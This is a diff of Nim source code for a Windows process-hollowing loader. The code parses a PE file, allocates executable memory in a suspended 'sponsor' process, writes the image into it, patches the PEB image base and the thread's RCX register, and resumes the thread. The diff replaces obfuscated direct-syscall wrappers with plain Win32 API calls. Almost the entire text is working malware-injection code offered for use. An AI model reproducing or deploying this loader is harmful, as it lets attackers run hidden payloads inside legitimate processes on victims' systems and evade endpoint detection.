@@ -1,11 +1,9 @@
 import winim
 import ptr_math
-import strutils
-
-include syscalls
+import std/strutils
 
 
-proc hollow2*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
+proc hollow1*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
 
     # Parse PE
     var peBytes = @(peStr.toOpenArrayByte(0, peStr.high))
@@ -15,9 +13,9 @@ proc hollow2*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
     var peImageSectionsHeader = cast[ptr IMAGE_SECTION_HEADER](cast[size_t](peImageNtHeaders) + sizeof(IMAGE_NT_HEADERS))
     var peImageSizeOfHeaders = cast[size_t](peImageNtHeaders.OptionalHeader.SizeOfHeaders)
     var peImageSize = cast[size_t](peImageNtHeaders.OptionalHeader.SizeOfImage)
-    var peImageImageBase = cast[PVOID](peImageNtHeaders.OptionalHeader.ImageBase)
+    var peImageImageBase = cast[LPVOID](peImageNtHeaders.OptionalHeader.ImageBase)
     var peImageEntryPoint = cast[PVOID](peImageNtHeaders.OptionalHeader.AddressOfEntryPoint)
-    
+
     # Extract process information
     let sponsorProcessHandle = processInfoAddress.hProcess
     let sponsorThreadHandle = processInfoAddress.hThread
@@ -44,87 +42,72 @@ proc hollow2*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
     when not defined(release): echo "[i] Sponsor PEB address: 0x" & $cast[int](sponsorPeb).toHex
 
     # Allocate memory in sponsor process
-    when not defined(release): echo "[*] Allocating memory in sponsor process"     
-    if CbZGEMmsvlfsZxPo( # NtAllocateVirtualMemory
+    when not defined(release): echo "[*] Allocating memory in sponsor process"    
+    var newImageBaseAddress = VirtualAllocEx(
         sponsorProcessHandle,
-        addr peImageImageBase,
-        0,
-        addr peImageSize,
+        peImageImageBase,
+        peImageSize,
         MEM_COMMIT or MEM_RESERVE,
         PAGE_EXECUTE_READWRITE
-    ) != 0:
-        when not defined(release): echo "[-] Could not allocate memory at sponsor process at address 0x" & $cast[int](peImageImageBase).toHex
-        quit() 
-
-    when not defined(release): echo "[i] New image base address (preferred): 0x" & $cast[int](peImageImageBase).toHex 
-    when not defined(release): echo "[i] New entrypoint: 0x" & $(cast[int](peImageImageBase) + cast[int](peImageEntryPoint)).toHex 
+    )
+    if newImageBaseAddress != peImageImageBase:
+        when not defined(release): echo "[-] Could not allocate at preffered address - 0x" & $cast[int](peImageImageBase).toHex   
+        quit()
+     
+    when not defined(release): echo "[i] New image base address (preferred): 0x" & $cast[int](newImageBaseAddress).toHex 
+    when not defined(release): echo "[i] New entrypoint: 0x" & $(cast[int](newImageBaseAddress) + cast[int](peImageEntryPoint)).toHex 
 
     # Copy PE headers to sponsor process 
     when not defined(release): echo "[*] Copying PE headers to sponsor process"    
-    if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
+    if WriteProcessMemory(
         sponsorProcessHandle,
-        peImageImageBase,
+        newImageBaseAddress,
         peBytesPtr,
         peImageSizeOfHeaders,
         NULL
-    ) != 0:
+    ) != TRUE:
         when not defined(release): echo "[-] Could not write to sponsor process"
         quit() 
 
     # Copy PE sections to sponsor process
     when not defined(release): echo "[*] Copying PE sections to sponsor process"    
     for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections)):
-        if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
+        if WriteProcessMemory(
             sponsorProcessHandle,
-            peImageImageBase + peImageSectionsHeader[i].VirtualAddress,
+            newImageBaseAddress + peImageSectionsHeader[i].VirtualAddress,
             peBytesPtr + peImageSectionsHeader[i].PointerToRawData,
             peImageSectionsHeader[i].SizeOfRawData,
             NULL
-        ) != 0:
-            when not defined(release): echo "[-] Could not write headers to sponsor process"
-            quit()
+        ) != TRUE:
+            when not defined(release): echo "[-] Could not write to sponsor process"
+            quit() 
     
     # Overwrite sponsor PEB with the new image base address 
     when not defined(release): echo "[*] Overwriting PEB with the new image base address"
-    if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
+    if WriteProcessMemory(
         sponsorProcessHandle,
         cast[LPVOID](cast[int](sponsorPeb) + 0x10),
-        addr peImageImageBase,
+        addr newImageBaseAddress,
         8,
         NULL
-    ) != 0:
-        when not defined(release): echo "[-] Could not write sections to sponsor process"
-        quit()
+    ) != TRUE:
+        when not defined(release): echo "[-] Could not write to sponsor process"
+        quit() 
 
     # Change sponsor thread Entrypoint
     var context: CONTEXT
     context.ContextFlags = CONTEXT_INTEGER
-    if VzpSdkMDEGHOzTpB( # NtGetContextThread
-        sponsorThreadHandle, 
-        addr context
-    ) != 0:
+    if GetThreadContext(sponsorThreadHandle, addr context) == FALSE:
         when not defined(release): echo "[-] Could not read from sponsor process PEB"
         quit()
-    var entryPoint = cast[DWORD64](peImageImageBase) + cast[DWORD64](peImageEntryPoint)
-    var x = context.Rcx #[
-    Here I've been experiencing the fucking wierdest BUG in the whole world of humanity
-    Don't know why, but if you remove this line, it would not work and you will never understand why
-    Wasted LOT of time here
-    ]# 
+    var entryPoint = cast[DWORD64](newImageBaseAddress) + cast[DWORD64](peImageEntryPoint)
     when not defined(release): echo "[i] Changing RCX register to point the new entrypoint: 0x" & $context.Rcx.toHex & " -> 0x" & $entryPoint.toHex
     context.Rcx = cast[DWORD64](entryPoint)
-    if IGyhziwCULdezDSq( # NtSetContextThread
-        sponsorThreadHandle, addr context
-    ) != 0:
-        when not defined(release): echo "[-] Could not write to from sponsor process PEB"
+    if SetThreadContext(sponsorThreadHandle, addr context) == FALSE:
+        when not defined(release): echo "[-] Could not write to sponsor process PEB"
         quit()
     
     # Resume remote thread 
     when not defined(release): echo "[*] Resuming remote thread"
-    if mAcJDfMgbUNFgsxu( # NtResumeThread
-        sponsorThreadHandle,
-        NULL
-    ) != 0:
-        when not defined(release): echo "[-] Could resume the thread"
-        quit()
-
+    ResumeThread(sponsorThreadHandle)
+    
